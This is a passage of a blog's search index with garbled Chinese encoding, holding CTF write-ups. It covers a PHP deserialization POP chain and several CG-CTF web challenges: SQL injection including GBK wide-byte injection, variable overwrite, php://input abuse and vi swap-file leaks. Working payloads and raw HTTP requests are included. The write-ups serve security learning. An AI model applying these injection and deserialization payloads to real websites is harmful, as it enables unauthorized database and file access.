\u0026quot;index.php\u0026quot;;\r}\r}\r}\rå®ƒå¯ä»¥è®¿é—®è‡ªèº«å±æ€§strçš„æˆå‘˜source\nå¦‚æœæˆ‘ä»¬æŠŠstrå±æ€§newä¸€ä¸ªTestï¼Œä½†æ˜¯Testé‡Œé¢å¹¶æ²¡æœ‰sourceå±æ€§ï¼Œ\né‚£ä¹ˆæˆ‘ä»¬newçš„Testå°±ä¼šä»¥å‡½æ•°çš„æ–¹å¼è°ƒç”¨$pé‚£ä¹ˆå¦‚æœ$påˆæ˜¯ä¸€ä¸ªModifierç±»ï¼Œå°±ä¼šè‡ªåŠ¨åŒ…å«$varæŒ‡å‘çš„é¡µé¢ã€‚\næ‰€ä»¥ï¼Œæˆ‘ä»¬æ„é€ çš„æ€è·¯æ˜¯ï¼š\n$poc = new Show; $poc-\u0026gt;source = new Show; $poc-\u0026gt;source-\u0026gt;str = new Test; $poc-\u0026gt;source-\u0026gt;str-\u0026gt;p = new Modifier;\rplayloadï¼š\n\u0026lt;?php\rclass Modifier {\rprotected $var = 'php://filter/read=convert.base64-encode/resource=flag.php';\rpublic function append($value){\rinclude($value);\r}\rpublic function __invoke(){\r$this-\u0026gt;append($this-\u0026gt;var);\r}\r}\rclass Show{\rpublic $source;\rpublic $str;\rpublic function __toString(){\rreturn $this-\u0026gt;str-\u0026gt;source;\r}\rpublic function __wakeup(){\rif(preg_match(\u0026quot;/gopher|http|file|ftp|https|dict|\\.\\./i\u0026quot;, $this-\u0026gt;source)) {\recho \u0026quot;hacker\u0026quot;;\r$this-\u0026gt;source = \u0026quot;index.php\u0026quot;;\r}\r}\r}\rclass Test{\rpublic $p;\rpublic function __get($key){\r$function = $this-\u0026gt;p;\rreturn $function();\r}\r}\r$poc = new Show;\r$poc-\u0026gt;source = new Show;\r$poc-\u0026gt;source-\u0026gt;str = new Test;\r$poc-\u0026gt;source-\u0026gt;str-\u0026gt;p = new Modifier;\recho serialize($poc);\rè§£é‡Šä¸€ä¸‹ï¼š\n$poc-\u0026gt;source = new Show;\r//ä¸ºä»€ä¹ˆè¦new showä¸¤æ¬¡ï¼Ÿ\r//è§¦å‘__toString()ï¼Œsourceè¢«ç¬¬ä¸€å±‚showå½“ä½œå­—ç¬¦ä¸²ï¼Œäºæ˜¯è®¿é—®source-\u0026gt;str-\u0026gt;source,ä¹Ÿå°±æ˜¯Testé‡Œé¢çš„source(ä¸å­˜åœ¨)ï¼Œè§¦å‘__get\r$poc-\u0026gt;source-\u0026gt;str = new Test;\r//$poc-\u0026gt;source-\u0026gt;str-\u0026gt;sourceï¼ˆTest-\u0026gt;sourceï¼‰ä¸å­˜åœ¨ï¼Œè§¦å‘__get\rè¿è¡Œè„šæœ¬ï¼Œå¾—åˆ°ï¼šï¼ˆæ³¨æ„ï¼šModifierç±»çš„protectå±æ€§æ³¨å…¥éœ€è¦åŠ %00ï¼‰\nO:4:\u0026quot;Show\u0026quot;:2:{s:6:\u0026quot;source\u0026quot;;O:4:\u0026quot;Show\u0026quot;:2:{s:6:\u0026quot;source\u0026quot;;N;s:3:\u0026quot;str\u0026quot;;O:4:\u0026quot;Test\u0026quot;:1:{s:1:\u0026quot;p\u0026quot;;O:8:\u0026quot;Modifier\u0026quot;:1:{s:6:\u0026quot;%00*%00var\u0026quot;;s:57:\u0026quot;php://filter/read=convert.base64-encode/resource=flag.php\u0026quot;;}}}s:3:\u0026quot;str\u0026quot;;N;}\rGETä¼ å€¼å³è·flag.php\nMRCTF{1892c0f7-3c71-431f-a991-7414ca1ea339}\n","date":"2020-03-29T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/%E7%94%B1mrctf2020%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/","title":"ç”±MRCTF2020å­¦ä¹ ååºåˆ—åŒ–POPé“¾"},{"content":"cgctfä¸å¾—ä¸è¯´æ˜¯ä¸€ä¸ªå¾ˆæ£’çš„å­¦ä¹ å¹³å°ï¼Œè¿™é‡Œæœ‰æˆ‘å†™çš„éƒ¨åˆ†wpï¼š\n\\0x00 è€ƒç‚¹ï¼š%00æˆªæ–­ï¼ˆeregå‡½æ•°çš„æˆªæ–­æ¼æ´ï¼‰ã€æ•°ç»„ç»•è¿‡ï¼ˆeregå‡½æ•°çš„å¦ä¸€ä¸ªæ¼æ´ï¼‰\né¢˜ç›®ç›´æ¥ç»™æºç ï¼š\nview-source:\rif (isset ($_GET['nctf'])) {\rif (@ereg (\u0026quot;^[1-9]+$\u0026quot;, $_GET['nctf']) === FALSE)\recho 'å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ';\relse if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag);\relse\recho 'éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~';\r}\r è¿™é‡Œeregæœ‰ä¸¤ä¸ªæ¼æ´ï¼š  â‘ %00æˆªæ–­åŠé‡åˆ°%00åˆ™é»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„ç»“æŸ\nâ‘¡å½“ntfä¸ºæ•°ç»„æ—¶å®ƒçš„è¿”å›å€¼ä¸æ˜¯FALSE\næ³•ä¸€ï¼šæ•°ç»„ç»•è¿‡\rindex.php?nctf[]=#biubiubiu\ræ³•äºŒï¼š\\x00æˆªæ–­\rindex.php?nctf=1%00%23biubiubiu\rnctf{use_00_to_jieduan}\nphp ååºåˆ—åŒ–(æš‚æ—¶æ— æ³•åš) è€ƒç‚¹ï¼šå¯¹è±¡åŒ…å«çš„å¼•ç”¨åœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¢«å­˜å‚¨\né¢˜ç›®æºç ï¼š\n\u0026lt;?php\rclass just4fun {\rvar $enter;\rvar $secret;\r}\rif (isset($_GET['pass'])) {\r$pass = $_GET['pass'];\rif(get_magic_quotes_gpc()){\r$pass=stripslashes($pass);\r}\r$o = unserialize($pass);\rif ($o) {\r$o-\u0026gt;secret = \u0026quot;*\u0026quot;;\rif ($o-\u0026gt;secret === $o-\u0026gt;enter)\recho \u0026quot;Congratulation! Here is my secret: \u0026quot;.$o-\u0026gt;secret;\relse echo \u0026quot;Oh no... You can't fool me\u0026quot;;\r}\relse echo \u0026quot;are you trolling?\u0026quot;;\r?\u0026gt;\rååºåˆ—åŒ–åï¼Œsecretä¼šè¢«é‡æ–°èµ‹å€¼ä¸ºä¸€ä¸ªæœªçŸ¥çš„å€¼ï¼Œä½†è¦æ±‚enterè·Ÿsecretçš„å€¼ä¸€è‡´æ‰èƒ½æ‹¿åˆ°flagã€‚\n å¯¹è±¡åŒ…å«çš„å¼•ç”¨åœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¢«å­˜å‚¨  ç¼–å†™è„šæœ¬ï¼š\n\u0026lt;?php\rclass just4fun {\rvar $enter;\rvar $secret;\r}\r$a= new just4fun;\r$a-\u0026gt;enter=\u0026amp;$a-\u0026gt;secret;\recho serialize($a);\r?\u0026gt;\ræ‰§è¡Œå¾—åˆ°ï¼š\nO:8:\u0026quot;just4fun\u0026quot;:2:{s:5:\u0026quot;enter\u0026quot;;N;s:6:\u0026quot;secret\u0026quot;;R:2;}\rGETä¼ å€¼è¿‡å»ï¼š\nhttp://4.chinalover.sinaapp.com/web25/index.php?pass=O:8:%22just4fun%22:2:{s:5:%22enter%22;N;s:6:%22secret%22;R:2;}\rå¾—åˆ°ï¼š\nCongratulation! Here is my secret: thisisnctfsecret\rå˜é‡è¦†ç›– è€ƒç‚¹ï¼šå˜é‡è¦†ç›–æ¼æ´\né¢˜ç›®å…³é”®éƒ¨åˆ†æºç ï¼š\n\u0026lt;?php if ($_SERVER[\u0026quot;REQUEST_METHOD\u0026quot;] == \u0026quot;POST\u0026quot;) { ?\u0026gt;\r\u0026lt;?php\rextract($_POST);\rif ($pass == $thepassword_123) { ?\u0026gt;\r\u0026lt;div class=\u0026quot;alert alert-success\u0026quot;\u0026gt;\r\u0026lt;code\u0026gt;\u0026lt;?php echo $theflag; ?\u0026gt;\u0026lt;/code\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;?php } ?\u0026gt;\r\u0026lt;?php } ?\u0026gt;\ræ•´ç†ä¸ºï¼š\n\u0026lt;?php\rif ($_SERVER[\u0026quot;REQUEST_METHOD\u0026quot;] == \u0026quot;POST\u0026quot;) {\rextract($_POST);\rif ($pass == $thepassword_123) {\recho $theflag;\r}\r}\r?\u0026gt;\r å˜é‡è¦†ç›–æ¼æ´å¤§å¤šæ•°ç”±å‡½æ•°ä½¿ç”¨ä¸å½“å¯¼è‡´ï¼Œç»å¸¸å¼•å‘å˜é‡è¦†ç›–æ¼æ´çš„å‡½æ•°æœ‰ï¼šextract(), parse_str() å’Œ import_request_variables()  extract()å˜é‡è¦†ç›–\n extract() å‡½æ•°ä»æ•°ç»„ä¸­æŠŠå˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­ã€‚å¯¹äºæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œé”®åç”¨äºå˜é‡åï¼Œé”®å€¼ç”¨äºå˜é‡å€¼ã€‚  \u0026lt;?php\r$auth = '0';\rextract($_GET)ï¼›\rif($auth==1){\recho \u0026quot;private!\u0026quot;;\r}else{\recho \u0026quot;public!\u0026quot;;\r}\r?\u0026gt;\rå‡è®¾ç”¨æˆ·æ„é€ ä»¥ä¸‹é“¾æ¥ï¼šhttp://www.a.com/test1.php?auth=1\nåˆ™ç«™ç‚¹ä¼šè¾“å‡ºâ€œprivateï¼â€\næ‰€ä»¥playloadæ˜¯ï¼šï¼ˆburp suiteæ•°æ®åŒ…ï¼‰\nPOST /web18/ HTTP/1.1\rHost: chinalover.sinaapp.com\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 24\rOrigin: http://chinalover.sinaapp.com\rConnection: close\rReferer: http://chinalover.sinaapp.com/web18/index.php\rUpgrade-Insecure-Requests: 1\rpass=1\u0026amp;thepassword_123=1\rnctf{bian_liang_fu_gai!}\nå˜é‡è¦†ç›–2 è€ƒç‚¹ï¼šéå†åˆå§‹åŒ–å˜é‡å¯¼è‡´å˜é‡è¦†ç›–\né¢˜ç›®æºç ï¼š\n\u0026lt;!--\rforeach($_GET as $key =\u0026gt; $value){ $$key = $value; } if($name == \u0026quot;meizijiu233\u0026quot;){\recho $flag;\r}\r--\u0026gt;\rï¼ˆè¯¦è§æœ¬ç«™â€œå˜é‡è¦†ç›–æ¼æ´å­¦ä¹ ç¬”è®°â€ï¼‰\nplayload:\nchinalover.sinaapp.com/web24/?name=meizijiu233\rnctf{AD3FBD8D5928693CA499347C91570AE6}\nSQL Injection çŸ¥è¯†ç‚¹ï¼šPHPä»£ç å®¡è®¡ï¼Œsqlè¯­è¨€åŸºç¡€ï¼Œ\\è½¬ä¹‰å•å¼•å·\né¢˜ç›®ï¼š\n\u0026lt;!--\r#GOAL: login as admin,then get the flag;\rerror_reporting(0);\rrequire 'db.inc.php';\rfunction clean($str){\rif(get_magic_quotes_gpc()){\r$str=stripslashes($str);\r}\rreturn htmlentities($str, ENT_QUOTES);\r}\r$username = @clean((string)$_GET['username']);\r$password = @clean((string)$_GET['password']);\r$query='SELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';';\r$result=mysql_query($query);\rif(!$result || mysql_num_rows($result) \u0026lt; 1){\rdie('Invalid password!');\r}\recho $flag;\r--\u0026gt;\rInvalid password!\r ä»£ç ä¸­clean()å‡½æ•°å»æ‰è½¬ä¹‰ï¼Œhtmlentities($str, ENT_QUOTES)ä¼šè½¬æ¢å•å¼•å·å’ŒåŒå¼•å·ã€‚è¿™é‡Œæˆ‘ä»¬åªèƒ½é€šè¿‡å¼•å…¥åæ–œæ ï¼Œè½¬ä¹‰åŸæœ‰çš„å•å¼•å·ï¼Œæ”¹å˜åŸsqlè¯­å¥çš„é€»è¾‘ï¼Œå¯¼è‡´sqlæ³¨å…¥ã€‚  payloadå¦‚ä¸‹ï¼š\n?username=\\\u0026amp;password= or 1#//è¦urlcodeç¼–ç ä¸€ä¸‹ï¼Œä¸ç„¶#ä¼šè¢«æµè§ˆå™¨å½“ä½œç©ºå­—ç¬¦\räºæ˜¯sqlæŸ¥è¯¢è¯­å¥ä¸ºï¼š\nSELECT * FROM users WHERE\rname='\\' AND pass=' //æ­¤æ—¶ï¼Œ\\'å·²è¢«è½¬ä¹‰ä¸ºä¸€ä¸ªå­—ç¬¦ï¼Œä¸ä¼šèµ·åˆ°å¼•å·çš„ä½œç”¨\ror 1\r#'\rflag:nctf{sql_injection_is_interesting}\nSQLæ³¨å…¥2 è€ƒç‚¹ï¼šunionæŸ¥è¯¢ï¼ŒunionæŸ¥è¯¢çš„æ—¶å€™ï¼Œè¿”å›çš„ç»“æœçš„åˆ—åä¸ªç¬¬ä¸€æ¡æŸ¥è¯¢è¯­å¥æ˜¯ç›¸åŒçš„\nSQL UNION è¯­æ³• SELECT column_name(s) FROM table_name1\rUNION\rSELECT column_name(s) FROM table_name2\rå¦‚æœè¦æŸ¥è¯¢é‡å¤çš„å€¼ï¼Œå¯ä»¥ä½¿ç”¨ UNION ALLï¼š\nSELECT column_name(s) FROM table_name1\rUNION ALL\rSELECT column_name(s) FROM table_name2\rå®ä¾‹ åˆ—å‡ºæ‰€æœ‰åœ¨ä¸­å›½å’Œç¾å›½çš„ä¸åŒçš„é›‡å‘˜åï¼š\nSELECT E_Name FROM Employees_China\rUNION\rSELECT E_Name FROM Employees_USA\rç»“æœ    E_Name     Zhang, Hua   Wang, Wei   Carter, Thomas   Yang, Ming   Adams, John   Bush, George   Gates, Bill    æ³¨æ„ï¼š\n unionæŸ¥è¯¢å¿…é¡»å’Œç¬¬ä¸€å¥æŸ¥è¯¢è¯­å¥æŸ¥è¯¢åˆ—æ•°ç›¸åŒï¼Œä¸ç„¶ä¼šå‡ºç°é”™è¯¯ï¼› unionæŸ¥è¯¢çš„æ—¶å€™ï¼Œè¿”å›çš„ç»“æœçš„åˆ—åä¸ªç¬¬ä¸€æ¡æŸ¥è¯¢è¯­å¥æ˜¯ç›¸åŒçš„ unionç¬¬ä¸€æ¡æŸ¥è¯¢å¤±è´¥åä¼šè¿”å›ç¬¬äºŒæ¡çš„ç»“æœï¼Œä½†æ˜¯åˆ—åè¿˜æ˜¯ç¬¬ä¸€æ¡æŸ¥è¯¢çš„åˆ—å  æ­¤é¢˜æ­£æ˜¯ç”¨åˆ°äº†ç¬¬ä¸‰æ¡çŸ¥è¯†ç‚¹ï¼š\n\u0026lt;html\u0026gt;\r\u0026lt;head\u0026gt;\rSecure Web Login II\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;?php\rif($_POST[user] \u0026amp;\u0026amp; $_POST[pass]) {\rmysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);\rmysql_select_db(SAE_MYSQL_DB);\r$user = $_POST[user];\r$pass = md5($_POST[pass]);\r$query = @mysql_fetch_array(mysql_query(\u0026quot;select pw from ctf where user='$user'\u0026quot;));\rif (($query[pw]) \u0026amp;\u0026amp; (!strcasecmp($pass, $query[pw]))) {\recho \u0026quot;\u0026lt;p\u0026gt;Logged in! Key: ntcf{**************} \u0026lt;/p\u0026gt;\u0026quot;;\r}\relse {\recho(\u0026quot;\u0026lt;p\u0026gt;Log in failure!\u0026lt;/p\u0026gt;\u0026quot;);\r}\r}\r?\u0026gt;\r\u0026lt;form method=post action=index.php\u0026gt;\r\u0026lt;input type=text name=user value=\u0026quot;Username\u0026quot;\u0026gt;\r\u0026lt;input type=password name=pass value=\u0026quot;Password\u0026quot;\u0026gt;\r\u0026lt;input type=submit\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;a href=\u0026quot;index.phps\u0026quot;\u0026gt;Source\u0026lt;/a\u0026gt;\r\u0026lt;/html\u0026gt;\ræ„æ€æ˜¯æŸ¥è¯¢åˆ°çš„pwå’Œè¾“å…¥çš„pwï¼ˆç»è¿‡md5åŠ å¯†åï¼‰ç›¸åŒï¼Œåˆ™è¾“å‡ºflagï¼›\nplayloadï¼š\nuser=' union select md5(1)#\rpw=1\ræŸ¥è¯¢ç»“æœå…¶å®æ˜¯ï¼š\n   pw     md5ï¼ˆ1ï¼‰    äºæ˜¯è¾“å…¥pw=1å³å¯æ»¡è¶³ï¼›\nnctf{union_select_is_wtf}\nGBK Injection çŸ¥è¯†ç‚¹ï¼š\nå®½å­—èŠ‚æ³¨å…¥ï¼š\nå½“ä¼ å…¥çš„å•å¼•å·ä¼šè¢«åæ–œæ è½¬ä¹‰çš„æ—¶å€™ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ä¸å­˜åœ¨sqlæ³¨å…¥æ¼æ´çš„ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªç‰¹ä¾‹ï¼Œé‚£å°±æ˜¯æ•°æ®åº“çš„ç¼–ç ä¸ºGBKæ—¶ï¼Œå¯ä»¥ä½¿ç”¨å®½å­—èŠ‚æ³¨å…¥ï¼Œå®½å­—èŠ‚çš„æ ¼å¼æ˜¯åœ¨åœ°å€åé¢å…ˆåŠ ä¸€ä¸ª%dfï¼Œå†åŠ å•å¼•å·ï¼Œå› ä¸ºåæ–œæ çš„ç¼–ç ä¸º%5cï¼Œç„¶è€Œå†GBKç¼–ç ä¸­ï¼Œ%df%5cæ˜¯ç¹ä½“å­—â€œè¬°â€ï¼Œæ‰€ä»¥è¿™ä¸ªæ—¶å€™ï¼Œå•å¼•å·å°±ä¸ä¼šè¢«åæ–œæ è½¬ä¹‰ï¼Œé€ æˆæ³¨å…¥ã€‚\nè¾“å…¥%dfä¹‹åï¼š\næ­¤æ—¶å·²ç»é€ æˆäº†æ³¨å…¥ï¼›\nå…ˆä½¿ç”¨order byè¯­å¥æŸ¥è¯¢å‡ºè¡¨ä¸­æœ‰å¤šå°‘åˆ—ï¼š\nid=1%df%27+order+by+2%23 //ä¸æŠ¥é”™\rid=1%df%27+order+by+3%23 //æŠ¥é”™ï¼Œåˆ¤æ–­åˆ—æ•°ä¸º2\ræˆ–è€…ä½¿ç”¨unionæŸ¥è¯¢ï¼š\nid=1%df%27+union+select+null,null%23 //ä¸æŠ¥é”™\rid=1%df%27+union+select+null,null,null%23 //æŠ¥é”™ï¼Œåˆ¤æ–­åˆ—æ•°ä¸º2\réšåå¯å°†nullæ¢æˆæŸ¥è¯¢è¯­å¥ï¼Œæƒ³è¦unionæŸ¥è¯¢åˆ°æˆ‘ä»¬è‡ªå·±è¾“å…¥çš„è¯­å¥ï¼Œéœ€è¦æŠŠ1æ¢æˆ-1ï¼Œ\nå› ä¸ºå•å¼•å·è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åµŒå¥—æŸ¥è¯¢ï¼š\n-1%df%27%20union+select+null,(select+table_name+from+information_schema.tables+where+table_schema=(select+database())limit+0,1)%23\rè¿™å¥å¯ä»¥æŸ¥åˆ°è¡¨åï¼Œä½†æ˜¯åªèƒ½æ’ä¸€ä¸ªï¼Œæƒ³è¦æŸ¥åˆ°å…¶ä»–çš„éœ€è¦æ›´æ”¹limitçš„å€¼\n-1%df%27%20union+select+null,(select+column_name+from+information_schema.columns+where+table_schema=(select+database())+and+table_name=(select+table_name+from+information_schema.tables+where+table_schema=(select+database())+limit+0,1)+limit+1,2)%23\rè¿™å¥å¯ä»¥æŸ¥åˆ°å­—æ®µåï¼›\nä½†æ˜¯è¿™é“é¢˜æˆ‘ä»¬ä¸æ¨èè¿™ä¸ªåµŒå¥—æŸ¥è¯¢çš„æ–¹æ³•ã€‚\næœ‰ä¸€ä¸ªç³»ç»Ÿè‡ªå¸¦çš„å‡½æ•°ï¼šgroup_concat()ï¼ˆä¸€èˆ¬æ˜¯CTFä¸­å¸¸ç”¨çš„ï¼‰:\nid=-1%df%27%20union+select+null,group_concat(table_name)+from+information_schema.tables+where+table_schema=database()%23\rç›´æ¥æŸ¥åˆ°äº†æ‰€æœ‰è¡¨åï¼›\nè™½ç„¶å•å¼•å·è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨16è¿›åˆ¶ç»•è¿‡çš„æ–¹æ³•ï¼š\nid=-1%df%27%20union+select+null,group_concat(column_name)+from+information_schema.columns+where+table_name=0x6e657773%23\rç›´æ¥æŸ¥åˆ°äº†newsï¼ˆ0x6e657773ï¼‰è¡¨ä¸­æ‰€æœ‰å­—æ®µåï¼›\nåœ¨è¿™ä¹‹åï¼Œå¯ä»¥æŠŠunionä¸­çš„nullæ›¿æ¢ä¸ºæŸ¥è¯¢è¯­å¥\nselect å­—æ®µå from è¡¨å\nid=-1%df%27%20union%20select%20null,flag%20from%20ctf4%23\rå½“ç„¶å…¶ä»–çš„è¡¨å­˜åœ¨å‡çš„flagï¼Œè¿™ä¸ªæ‰æ˜¯çœŸçš„ï¼›\nflag{this_is_sqli_flag}\nfile_get_contents çŸ¥è¯†ç‚¹ï¼šphp://inputè®¿é—®POSTè¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµ\nè®¿é—®é¢˜ç›®ï¼ŒæŸ¥çœ‹æºç ï¼š\n\u0026lt;!--$file = $_GET['file'];\rif(@file_get_contents($file) == \u0026quot;meizijiu\u0026quot;){\recho $nctf;\r}--\u0026gt;\rè¿™é‡Œä½¿ç”¨PHPä¼ªåè®®php://inputè®¿é—®æœªå¤„ç†è¿‡çš„POSTæ•°æ®ï¼š\nburp suiteå‘åŒ…ï¼š\nPOST /web23/?file=php://input HTTP/1.1\rHost: chinalover.sinaapp.com\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rConnection: close\rUpgrade-Insecure-Requests: 1\rContent-Length: 8\rmeizijiu\rå¯ä»¥ç›´æ¥å¾—åˆ°flagï¼š\nnctf{0b021b88527c69e5}\nç»¼åˆé¢˜ è€ƒç‚¹ï¼šJSFuckã€å‘½ä»¤è®°å½•æ–‡ä»¶.bash_history\næ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸²çš„JSFuckï¼š\nç›´æ¥å¤åˆ¶åˆ°F12é‡Œé¢çš„æ§åˆ¶å°è¿è¡Œï¼Œå¾—åˆ°ï¼š\n1bc29b36f623ba82aaf6724fd3b16718.php\rç›´æ¥è®¿é—®è¿™ä¸ªé¡µé¢ï¼š\nè¿™é‡Œæ˜¯ä¸€ä¸ªè„‘æ´ï¼Œ\nå…¶å®ä»–è¯´TIPåœ¨ä»–è„‘è¢‹é‡Œï¼Œå…¶å®å°±æ˜¯â€œheadâ€ï¼Œæš—ç¤ºäº†HTTPå¤´ï¼š\ntip: history of bash\rLinuxçš„ ç”¨æˆ·ç›®å½•ä¸‹ä¸‰ä¸ªbashæ–‡ä»¶çš„ä½œç”¨: (.bash_history,.bash_logout,.bash_profile,.bashrc)\nè¿™é‡Œå°±åªè¯´.bash_history:\n Bash shellåœ¨â€œ~/.bash_historyâ€ï¼ˆâ€œ~/â€è¡¨ç¤ºç”¨æˆ·ç›®å½•ï¼‰æ–‡ä»¶ä¸­ä¿å­˜äº†500æ¡ä½¿ç”¨è¿‡çš„å‘½ä»¤ï¼Œè¿™æ ·èƒ½ä½¿ä½ è¾“å…¥ä½¿ç”¨è¿‡çš„é•¿å‘½ä»¤å˜å¾—å®¹æ˜“ã€‚æ¯ä¸ªåœ¨ç³»ç»Ÿä¸­æ‹¥æœ‰è´¦å·çš„ç”¨æˆ·åœ¨ä»–çš„ç›®å½•ä¸‹éƒ½æœ‰ä¸€ä¸ªâ€œ.bash_historyâ€æ–‡ä»¶ã€‚  äºæ˜¯æˆ‘ä»¬è®¿é—®.bash_historyè¿™ä¸ªæ–‡ä»¶ï¼š\næˆ‘ä»¬ç»§ç»­è®¿é—®flagbak.zipï¼Œå°±èƒ½ç›´æ¥ä¸‹è½½è¿™ä¸ªæ–‡ä»¶ï¼Œè§£å‹æ‰“å¼€å°±æ˜¯flagï¼š\nnctf{bash_history_means_what}\n å¯†ç é‡ç½®2 è€ƒç‚¹ï¼šLinuxä¸‹viç¼–è¾‘å™¨é€€å‡ºåç•™ä¸‹çš„å¤‡ä»½æ–‡ä»¶ã€å¼±ç±»å‹æ¯”è¾ƒ\næŸ¥çœ‹æºç ä¸­å¯ä»¥æ‰¾åˆ°adminçš„é‚®ç®±ï¼Œéšæ„èˆ”ä¸€ä¸ªtokenåæäº¤å¾—åˆ°ä¸€ä¸ªæç¤ºfailçš„é¡µé¢ï¼›\næ ¹æ®é¢˜å¹²çš„æç¤ºï¼Œè¿™ä¸ªæ˜¯ç”¨Linuxä¸‹viç¼–è¾‘å™¨ç¼–è¾‘çš„ï¼›\n å½“éæ­£å¸¸å…³é—­vimç¼–è¾‘å™¨æ—¶ï¼ˆæ¯”å¦‚ç›´æ¥å…³é—­ç»ˆç«¯æˆ–è€…ç”µè„‘æ–­ç”µï¼‰ï¼Œä¼šç”Ÿæˆä¸€ä¸ª.swpæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯ä¸€ä¸ªä¸´æ—¶äº¤æ¢æ–‡ä»¶ï¼Œç”¨æ¥å¤‡ä»½ç¼“å†²åŒºä¸­çš„å†…å®¹ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯å¦‚æœä½ å¹¶æ²¡æœ‰å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œè€Œåªæ˜¯è¯»å–æ–‡ä»¶ï¼Œæ˜¯ä¸ä¼šäº§ç”Ÿ.swpæ–‡ä»¶çš„ã€‚ æ„å¤–é€€å‡ºæ—¶ï¼Œå¹¶ä¸ä¼šè¦†ç›–æ—§çš„äº¤æ¢æ–‡ä»¶ï¼Œè€Œæ˜¯ä¼šé‡æ–°ç”Ÿæˆæ–°çš„äº¤æ¢æ–‡ä»¶ã€‚è€ŒåŸæ¥çš„æ–‡ä»¶ä¸­å¹¶ä¸ä¼šæœ‰è¿™æ¬¡çš„ä¿®æ”¹ï¼Œæ–‡ä»¶å†…å®¹è¿˜æ˜¯å’Œæ‰“å¼€æ—¶ä¸€æ ·ã€‚ ä¾‹å¦‚ï¼Œç¬¬ä¸€æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åä¸ºâ€œ.file.txt.swpâ€ï¼›å†æ¬¡æ„å¤–é€€å‡ºåï¼Œå°†ä¼šäº§ç”Ÿåä¸ºâ€œ.file.txt.swoâ€çš„äº¤æ¢æ–‡ä»¶ï¼›è€Œç¬¬ä¸‰æ¬¡äº§ç”Ÿçš„äº¤æ¢æ–‡ä»¶åˆ™ä¸ºâ€œ.file.txt.swnâ€ï¼›ä¾æ­¤ç±»æ¨ã€‚  å‚è€ƒï¼šhttps://blog.csdn.net/qq_35405259/article/details/86476663\näºæ˜¯æˆ‘ä»¬å¯ä»¥å»è®¿é—®\nhttp://nctf.nuptzj.cn/web14/.submit.php.swp //submitå‰é¢ä¸€å®šæœ‰ä¸€ä¸ª\u0026quot;.\u0026quot;\rå¯ä»¥å¾—åˆ°submité¡µé¢çš„æºç ï¼Œå…¶ä¸­å…³é”®éƒ¨åˆ†æ˜¯ï¼š\nif(!empty($token)\u0026amp;\u0026amp;!empty($emailAddress)){\rif(strlen($token)!=10) die('fail');\rif($token!='0') die('fail');\r$sql = \u0026quot;SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'\u0026quot;;\r$r = mysql_query($sql) or die('db error');\r$r = mysql_fetch_assoc($r);\r$r = $r['num'];\rif($r\u0026gt;0){\recho $flag;\r}else{\recho \u0026quot;å¤±è´¥äº†å‘€\u0026quot;;\r}\r}\rç¬¬2ã€3è¡Œå¼±ç±»å‹æ¯”è¾ƒï¼Œæˆ‘ä»¬åªéœ€è¦è¾“å…¥token=0000000000ï¼ˆ10ä¸ªï¼‰ï¼š\nnctf{thanks_to_cumt_bxs}\n","date":"2020-02-02T00:00:00Z","permalink":"https://anthem-whisper.github.io/p/cg-ctf_wp/","title":"CG-CTF_wp"},{"content":"è½¬è‡ªï¼šhttps://www.cnblogs.com/zery/p/3438845.html\næ•™ç¨‹ï¼šhttps://www.runoob.com/regexp/regexp-tutorial.html\nä¸€ ã€å‰è¨€ ã€€å¯¹äºæ­£åˆ™è¡¨è¾¾å¼ï¼Œç›¸ä¿¡å¾ˆå¤šäººéƒ½çŸ¥é“ï¼Œä½†æ˜¯å¾ˆå¤šäººçš„ç¬¬ä¸€æ„Ÿè§‰å°±æ˜¯éš¾å­¦ï¼Œå› ä¸ºçœ‹ç¬¬ä¸€çœ¼æ—¶ï¼Œè§‰å¾—å®Œå…¨æ²¡æœ‰è§„å¾‹å¯å¯»ï¼Œè€Œä¸”å…¨æ˜¯ä¸€å †å„ç§å„æ 